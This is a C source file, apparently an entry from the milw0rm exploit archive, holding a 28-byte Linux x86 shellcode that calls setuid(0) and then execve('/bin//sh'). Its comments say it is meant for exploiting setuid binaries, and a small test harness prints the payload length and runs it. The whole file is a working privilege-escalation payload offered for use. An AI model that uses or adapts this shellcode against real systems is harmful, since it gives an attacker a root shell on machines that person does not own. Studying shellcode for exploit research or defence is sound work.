/*
 * revenge-setuid.c, v1.0 2006/09/30 14:57
 *
 * linux/x86 setuid(0) + execve("/bin//sh", ["/bin//sh"], NULL) shellcode
 * once again...
 *
 * [    setuid (6 bytes) + execve (22 bytes)  = 28 bytes       ]
 * [                                                           ]
 * [    Same as revenge-execve.c we start the 2 system         ]
 * [    calls with a mov resulting in 2 bytes less, but        ]
 * [    this one is only for suid binary exploitation.         ]
 * [                                                           ]
 *
 * http://www.0xcafebabe.it
 * <revenge@0xcafebabe.it>
 *
 */

char sc[] =
                                     // <_start>
       "\xb0\x17"                    // mov    $0x17,%al
       "\x31\xdb"                    // xor    %ebx,%ebx
       "\xcd\x80"                    // int    $0x80
       "\xb0\x0b"                    // mov    $0xb,%al
       "\x99"                        // cltd
       "\x52"                        // push   %edx
       "\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
       "\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
       "\x89\xe3"                    // mov    %esp,%ebx
       "\x52"                        // push   %edx
       "\x53"                        // push   %ebx
       "\x89\xe1"                    // mov    %esp,%ecx
       "\xcd\x80"                    // int    $0x80
;

int main()
{
       void    (*fp)(void) = (void (*)(void))sc;

       printf("Length: %d\n",strlen(sc));
       fp();
}

// milw0rm.com [2006-11-16]